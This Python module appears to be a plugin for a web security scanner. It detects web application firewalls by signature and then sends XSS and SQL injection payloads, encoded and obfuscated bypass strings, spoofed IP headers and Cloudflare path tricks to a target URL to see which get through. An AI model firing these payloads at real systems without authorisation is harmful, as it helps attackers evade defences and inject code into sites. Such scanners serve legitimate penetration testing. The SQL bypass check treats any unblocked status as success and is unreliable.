import urllib.parse
import re
import random
import string
from . import get_session

# WAF detection signatures (partial strings that may indicate presence of WAF)
WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cf-chl-", "cf-cache-status"],
    "AWS WAF & Shield": ["x-amzn-waf", "aws-waf", "awselb", "x-amz-cf-id"],
    "ModSecurity": ["mod_security", "modsecurity", "naxsi", "wordfence"],
    "Sucuri": ["sucuri", "_sucuri", "sucuri_cloudproxy"],
    "Imperva/Incapsula": ["incap_ses", "_incapsula", "visid_incap"],
    "Akamai": ["akamai", "akamaighost", "x-akamai-"],
    "F5 BIG-IP ASM": ["bigip", "bigipreport", "x-wa-"],
    "Barracuda": ["barracuda", "barra_counter"],
    "Fortinet FortiWeb": ["fortiweb", "fortigate"],
    "Palo Alto": ["paloalto", "panorama"],
    "Citrix Application Firewall": ["citrix", "netscaler", "ns_af"],
    "Wordfence": ["wordfence", "wfwaf"],
    "Radware": ["radware", "rwsc"],
    "DotDefender": ["dotdefender", "x-dotdefender"],
    "Sonicwall": ["sonicwall", "sonicwallseries"],
    "NAXSI": ["naxsi"],
    "360WangZhanBao": ["wzws-waf-info", "wzws-ray-id"],
    "WebKnight": ["webknight", "fhcore"],
    "SafeDog": ["safedog", "waf/2.0"],
    "EdgeCast": ["ecdf", "ec-cache"],
    "MaxCDN": ["maxcdn"],
    "StackPath": ["stackpath"]
}

# Common WAF Bypass payloads categorized by technique
BYPASS_PAYLOADS = {
    "case_manipulation": [
        "SeLeCt",
        "uNiOn",
        "aNd 1=1",
        "OrDeR bY",
        "GrOuP bY"
    ],
    "url_encoding": [
        "%53%45%4c%45%43%54",  # SELECT
        "%55%4e%49%4f%4e",     # UNION
        "%41%4e%44%20%31%3d%31", # AND 1=1
        "%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e" # ><script>alert(1)</script>
    ],
    "double_encoding": [
        "%2553%2545%254c%2545%2543%2554",  # SELECT
        "%2555%254e%2549%254f%254e",       # UNION
        "%253e%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2531%2529%253c%252f%2573%2563%2572%2569%2570%2574%253e" # ><script>alert(1)</script>
    ],
    "alternative_representations": [
        "/*!50000SELECT*/", # MySQL version-specific comment
        "/*!union*//*!select*/",
        "/*!UnIoN*/ /*!SeLeCt*/", 
        "uni<on sel<ect",
        "sel/**/ect", 
        "un/**/ion sel/**/ect",
        "%23xyz%0Aselect", # Newline encoding
        "+union+distinct+select+",
        "+UnIoN/*&a=*/SeLeCT/*&a=*/"
    ],
    "comment_insertion": [
        "un/**/ion",
        "sel/**/ect",
        "/**/union/**/select/**/",
        "/*!50000select*/",
        "/!50000select/",
        "/*comment*/select/*comment*/",
        "/**/select/**/",
        "/**/UNION/**/",
        "/**/1/**/=/**/1"
    ],
    "space_substitution": [
        "UNION%09SELECT",
        "UNION%0ASELECT",
        "UNION%0CSELECT",
        "UNION%0DSELECT",
        "UNION%0BSELECT",
        "UNION%A0SELECT",
        "UNION%20SELECT"
    ],
    "character_substitution": [
        # SQL injection bypasses using char() or similar functions
        "CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84))",  # "SELECT"
        "CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)",          # "SELECT"
        # XSS bypasses
        "String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)", # <script>alert(1)</script>
        "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;" # <script>alert(1)</script>
    ],
    "string_concatenation": [
        "CONCAT('SEL','ECT')",
        "'SEL'+'ECT'",
        "S'||'E'||'L'||'ECT",
        "CONCAT('UN','ION')",
        "CONCAT('1',' OR ','1','=','1')"
    ],
    "null_byte": [
        "SELECT%00",
        "UNION%00SELECT",
        "<scri%00pt>alert(1)</scri%00pt>"
    ],
    "mixed_techniques": [
        # Combining multiple techniques
        "/*!50000%55nI*//*!50000%6Fn*//*!50000%20*//*!50000%53eLeCt*/",
        "%53%65%6c%65%63%74%20%44%69%73%74%69%6e%63%74%20%54%6f%70%20%31",
        "/*!u%6eion*/ /*!se%6cect*/",
        "%55/**/nion%20%53/**/elect"
    ]
}

# XSS payload that can help detect WAF behavior
XSS_PROBE_PAYLOAD = "<script>alert(1)</script>"
XSS_BYPASS_PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "';alert(1)//",
    "<script>setTimeout('alert(1)',0)</script>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animatetransform onbegin=alert(1)>",
    "<div onclick=\"alert(1)\">click me</div>"
]

# SQL injection probes
SQL_PROBE_PAYLOAD = "' OR 1=1 --"
SQL_BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "\" OR \"1\"=\"1\" /*",
    "1' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "1') OR ('1'='1"
]

# HTTP headers to test for bypassing WAF restrictions
BYPASS_HEADERS = {
    "X-Forwarded-For": ["127.0.0.1", "10.0.0.1", "192.168.1.1", "172.16.0.1", "8.8.8.8"],
    "X-Real-IP": ["127.0.0.1", "10.0.0.1", "192.168.1.1"],
    "X-Originating-IP": ["127.0.0.1", "10.0.0.1", "192.168.1.1"],
    "X-Remote-IP": ["127.0.0.1", "10.0.0.1", "192.168.1.1"],
    "X-Remote-Addr": ["127.0.0.1", "10.0.0.1", "192.168.1.1"],
    "X-Client-IP": ["127.0.0.1", "10.0.0.1", "192.168.1.1"],
    "X-Host": ["127.0.0.1", "localhost"],
    "User-Agent": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    ],
    "Referer": ["https://www.google.com", "https://www.bing.com"],
    "Content-Type": ["application/x-www-form-urlencoded", "application/json", "multipart/form-data", "text/plain"]
}

def check(session, url, soup, response, config):
    """
    Test for WAF presence and attempt various bypass techniques
    
    Args:
        session: Session object for making requests
        url: Target URL to test
        soup: BeautifulSoup object of the response
        response: HTTP response object
        config: Configuration dictionary
    
    Returns:
        List of findings
    """
    req_session = get_session(session)
    findings = []
    
    # Parse the URL
    parsed_url = urllib.parse.urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # Step 1: Detect if a WAF is present
    detected_waf = []
    
    # Check response headers for WAF signatures
    for waf_name, signatures in WAF_SIGNATURES.items():
        for header_name, header_value in response.headers.items():
            for signature in signatures:
                if signature.lower() in header_value.lower() or signature.lower() in header_name.lower():
                    detected_waf.append(waf_name)
                    break
    
    # Check for WAF in HTML response (sometimes WAFs insert content)
    if response.text:
        for waf_name, signatures in WAF_SIGNATURES.items():
            for signature in signatures:
                if signature.lower() in response.text.lower():
                    detected_waf.append(waf_name)
                    break
    
    # Remove duplicates
    detected_waf = list(set(detected_waf))
    
    if detected_waf:
        findings.append(f"WAF detected: {', '.join(detected_waf)}")
    else:
        findings.append("No WAF signatures detected, but WAF might still be present")
    
    # Step 2: Try to identify the behavior of the WAF by triggering it with known malicious payloads
    waf_behavior = {}
    
    # Function to randomly select a parameter from the URL
    def get_random_param():
        query_params = urllib.parse.parse_qs(parsed_url.query)
        if query_params:
            return random.choice(list(query_params.keys()))
        else:
            # If no parameters in URL, generate a random one
            return 'id'
    
    # Test XSS probe
    param = get_random_param()
    xss_test_url = f"{base_url}?{param}={urllib.parse.quote(XSS_PROBE_PAYLOAD)}"
    
    try:
        xss_response = req_session.get(xss_test_url, timeout=10)
        if xss_response.status_code in [403, 406, 429, 501, 502]:
            waf_behavior["xss_block_status"] = xss_response.status_code
            findings.append(f"WAF blocks XSS with status code: {xss_response.status_code}")
        elif XSS_PROBE_PAYLOAD not in xss_response.text:
            waf_behavior["xss_sanitized"] = True
            findings.append("WAF appears to sanitize XSS payloads (payload not reflected in response)")
    except Exception as e:
        findings.append(f"Error testing XSS probe: {str(e)}")
    
    # Test SQL Injection probe
    sql_test_url = f"{base_url}?{param}={urllib.parse.quote(SQL_PROBE_PAYLOAD)}"
    
    try:
        sql_response = req_session.get(sql_test_url, timeout=10)
        if sql_response.status_code in [403, 406, 429, 501, 502]:
            waf_behavior["sql_block_status"] = sql_response.status_code
            findings.append(f"WAF blocks SQL injection with status code: {sql_response.status_code}")
    except Exception as e:
        findings.append(f"Error testing SQL injection probe: {str(e)}")
    
    # Only test bypasses if WAF was detected or suspicious behavior was observed
    if detected_waf or waf_behavior:
        # Step 3: Test WAF bypass techniques
        
        # Generate a random string as a unique identifier for each request
        def random_string(length=10):
            return ''.join(random.choice(string.ascii_letters) for _ in range(length))
        
        # Function to test a set of bypass payloads against a specific vulnerability type
        def test_bypass_category(category_name, payloads, base_payload, success_condition):
            successful_bypasses = []
            
            for technique, payload_list in payloads.items():
                # Test a limited number of payloads from each technique (to avoid too many requests)
                for payload in payload_list[:2]:  # Test only first 2 from each technique
                    test_id = random_string()
                    request_url = f"{base_url}?{param}={urllib.parse.quote(payload)}&testid={test_id}"
                    
                    try:
                        bypass_response = req_session.get(request_url, timeout=10)
                        
                        # Check if the bypass was successful based on the provided condition
                        if success_condition(bypass_response, payload, test_id):
                            successful_bypasses.append(f"{technique}: {payload}")
                            
                            # No need to test more payloads from this technique if we found a working one
                            break
                    except Exception:
                        continue
            
            return successful_bypasses
        
        # Test XSS bypasses
        xss_bypasses = []
        if "xss_block_status" in waf_behavior or "xss_sanitized" in waf_behavior:
            # Test some individual XSS bypasses from the list
            for payload in XSS_BYPASS_PAYLOADS[:5]:  # Test only first 5 to limit requests
                test_id = random_string()
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}&testid={test_id}"
                
                try:
                    bypass_response = req_session.get(test_url, timeout=10)
                    
                    # Check if bypass was successful
                    if (bypass_response.status_code not in [403, 406, 429, 501, 502] and
                        payload in bypass_response.text):
                        xss_bypasses.append(payload)
                except Exception:
                    continue
        
        # Test SQL injection bypasses
        sql_bypasses = []
        if "sql_block_status" in waf_behavior:
            # Test some individual SQL injection bypasses
            for payload in SQL_BYPASS_PAYLOADS[:5]:  # Test only first 5 to limit requests
                test_id = random_string()
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}&testid={test_id}"
                
                try:
                    bypass_response = req_session.get(test_url, timeout=10)
                    
                    # Check if bypass was successful (may not be conclusive without knowing application behavior)
                    if bypass_response.status_code not in [403, 406, 429, 501, 502]:
                        # This is a simplified check - a real app would need to look for SQL errors or unexpected behavior
                        sql_bypasses.append(payload)
                except Exception:
                    continue
        
        # Test header-based bypasses
        header_bypasses = []
        if detected_waf:
            for header_name, header_values in BYPASS_HEADERS.items():
                for value in header_values[:2]:  # Test only first 2 values for each header to limit requests
                    headers = {header_name: value}
                    
                    try:
                        # Test with a known blocked payload
                        test_url = f"{base_url}?{param}={urllib.parse.quote(XSS_PROBE_PAYLOAD)}"
                        header_response = req_session.get(test_url, headers=headers, timeout=10)
                        
                        # Check if adding the header bypassed the WAF
                        if (header_response.status_code not in [403, 406, 429, 501, 502] and
                            ("xss_block_status" in waf_behavior and waf_behavior["xss_block_status"] != header_response.status_code)):
                            header_bypasses.append(f"{header_name}: {value}")
                    except Exception:
                        continue
        
        # Add findings for any successful bypasses
        if xss_bypasses:
            findings.append("Successfully bypassed WAF XSS protection with:")
            for bypass in xss_bypasses[:3]:  # Limit to first 3 findings
                findings.append(f"- {bypass}")
        
        if sql_bypasses:
            findings.append("Potentially bypassed WAF SQL injection protection with:")
            for bypass in sql_bypasses[:3]:  # Limit to first 3 findings
                findings.append(f"- {bypass}")
        
        if header_bypasses:
            findings.append("Successfully bypassed WAF using HTTP headers:")
            for bypass in header_bypasses[:3]:  # Limit to first 3 findings
                findings.append(f"- {bypass}")
        
        # Test bypasses for specific WAFs if detected
        if "Cloudflare" in detected_waf:
            findings.append("Testing Cloudflare-specific bypasses...")
            
            # Test for known Cloudflare bypasses like path traversal issues
            cf_bypass_payloads = [
                "/..;/",
                "/%2e%2e;/",
                "/./."
            ]
            
            for payload in cf_bypass_payloads:
                try:
                    bypass_url = f"{base_url}{payload}"
                    cf_response = req_session.get(bypass_url, timeout=10)
                    
                    if cf_response.status_code not in [403, 406, 429, 501, 502]:
                        findings.append(f"Potential Cloudflare path bypass: {payload}")
                except Exception:
                    continue
        
        # Similar tests can be added for other specific WAFs
    
    return findings 